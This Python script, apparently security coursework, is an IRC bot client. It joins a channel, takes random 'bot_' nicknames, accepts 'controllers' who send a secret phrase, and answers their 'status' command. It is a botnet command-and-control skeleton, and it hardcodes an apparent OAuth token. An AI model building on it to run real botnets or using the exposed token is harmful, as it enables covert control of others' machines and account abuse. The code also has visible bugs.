import socket
import time
import sys
import random, string
import irc

HOST = "irc.twitch.tv"              # the Twitch IRC server
PORT = 6667                         # always use port 6667!
NICK = "cpsc526bot"            # your Twitch username, lowercase
PASS = "oauth:ust447elexk8yx2b4jrhm1nhjcxw8r" # your Twitch OAuth token
CHAN = "#cpsc526bot"                   # the channel you want to join
AUTHENTICATED_CONTROLLERS = []


def parsemsg(s):
    """Breaks a message from an IRC server into its prefix, command, and arguments.
    """
    prefix = ''
    trailing = []
    if not s:
       raise IRCBadMessage("Empty line.")
    if s[0] == ':':
        prefix, s = s[1:].split(' ', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        args = s.split()
        args.append(trailing)
    else:
        args = s.split()
    command = args.pop(0)
    return prefix, command, args

# returns random 5 char string
def generate_nickname(length):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

def privmsg(destination, msg):
    ret = "PRIVMSG "+destination+" :"+msg+"\r\n"
    return ret

if __name__ == "__main__":

    if len(sys.argv) == 5:
        
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        CHAN = sys.argv[3]
        PASS = sys.argv[4]
        NICK = 'bot_'+generate_nickname(5)

        s = socket.socket()
        
        while True:
            try:
                s.connect((HOST, PORT))
                s.send("PASS {}\r\n".format(PASS).encode("utf-8"))
                s.send("NICK {}\r\n".format(NICK).encode("utf-8"))
                s.send("USER b 0 * :{}\r\n".format(NICK).encode("utf-8"))
                s.send("JOIN {}\r\n".format(CHAN).encode("utf-8"))

                print("Connected to IRC with nickname "+NICK+"...")

                while True:
                    response = s.recv(1024).decode("utf-8")

                    if 'PING' in response:
                        print(response)
                        msg = response.split(':')
                        print('PONG '+msg[1]+'\r\n')
                        s.send(('PONG '+msg[1]+'\r\n').encode("utf-8"))
                    else:

                        # args[1].strip() = message
                        (prefix, command, args)= parsemsg(response)
                        sender = prefix.split("!")[0]
                        print(sender)
                        # debug msgs
                        print("prefix: " + prefix)
                        print("command: " + command)
                        for p in args: print ("arg["+p.strip()+"]") 

                        # if nickname already in use
                        if command == "433":
                            NICK = 'bot_'+generate_nickname(5)
                            s.send(("NICK "+NICK+"\r\n").encode('utf-8'))
                        
                        # if privmsg
                        elif command == "PRIVMSG":
                            
                            # from channel
                            if args[0] == CHAN and args[1].strip() == "!saysomething":
                                    s.send("PRIVMSG {} :Im a new message\r\n".format(CHAN).encode("utf-8"))
                                    print("PRIVMSG {} :Im a new message\r\n".format(CHAN).encode("utf-8"))
                            elif args[0] == CHAN and args[1].strip() == "!quit":
                                    s.send("PRIVMSG {} : "+NICK+ " out!\r\n".format(CHAN).encode("utf-8"))
                                    print(NICK + " out!")
                                    break
                            # from other users
                            elif sender not in AUTHENTICATED_CONTROLLERS and args[1].strip() == PASS:
                                AUTHENTICATED_CONTROLLERS.append(sender)
                                print(sender + " is an authenticated controller!")
                            elif sender in AUTHENTICATED_CONTROLLERS:
                                print("Message received from a controller...")
                                if args[1].strip() == "status":
                                    s.send(privmsg(sender, NICK).encode('utf-8'))
                                    print("Sending "+privmsg(sender, NICK))
                    #print(response)
                s.close()
                #sleep(1 / cfg.RATE)
            except socket.error as e:
                print("{0}\n".format(e))
                print("Sleeping...\n")
                # If connection fails, sleep for 5s then connect again 
                time.sleep(5)
                continue
    else:
        print("USAGE: python3 bot.py <hostname> <port> <channel> <secret-phrase>")
        sys.exit(1)
